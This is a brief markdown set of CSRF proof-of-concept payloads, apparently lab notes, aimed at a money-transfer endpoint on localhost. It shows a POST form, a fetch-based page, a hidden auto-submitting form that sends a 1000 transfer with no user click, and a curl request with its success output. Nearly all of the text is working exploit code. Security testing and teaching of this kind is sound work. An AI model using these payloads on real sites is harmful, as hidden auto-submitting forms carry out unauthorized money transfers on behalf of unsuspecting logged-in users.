### First Method with an simple interface
```
<form action="http://localhost:8080" method="POST">

<input type="number" name="amount" value="100"/>
<input type="submit" value="Transfer Money"/>
```
### Second Method with an interface more developped ! and the content-type but not really needed.

```
<!DOCTYPE html>
<html lang="fr">
<head>
<meta charset="UTF-8">
<title>Test CSRF Interactif</title>
</head>
<body>
<h2>Test CSRF / Transfer Interactif</h2>

<p>Entrez le montant que vous voulez tester :</p>

<form id="csrfForm">
  <label for="amount">Montant :</label>
  <input type="number" id="amount" name="amount" value="50" min="1"/>
  <input type="submit" value="Envoyer POST"/>
</form>

<h3>Résultat :</h3>
<pre id="result"></pre>

<script>
document.getElementById('csrfForm').addEventListener('submit', async function(e) {
    e.preventDefault(); // Empêche le rechargement de la page

    const amount = document.getElementById('amount').value;

    try {
        const response = await fetch('http://localhost:8080/transfer', {
            method: 'POST',
            headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
            body: new URLSearchParams({ amount })
        });

        const data = await response.json();
        document.getElementById('result').textContent = JSON.stringify(data, null, 2);
    } catch (err) {
        document.getElementById('result').textContent = 'Erreur: ' + err.message;
    }
});
</script>
</body>
</html>
```

### Third method it transfer the amount without clicking on the submit button
```
<form action="http://localhost:8080/transfer" method="POST">
  <input type="hidden" name="amount" value="1000"/>
</form>
<script>
  document.forms[0].submit();
</script>
```

### Bonus method you only have to send this request with curl and bingo.
```
curl -X POST http://localhost:8080/transfer -d "amount=1000"

return value {"success":true}. So we can see the POST request has been accepted.
```
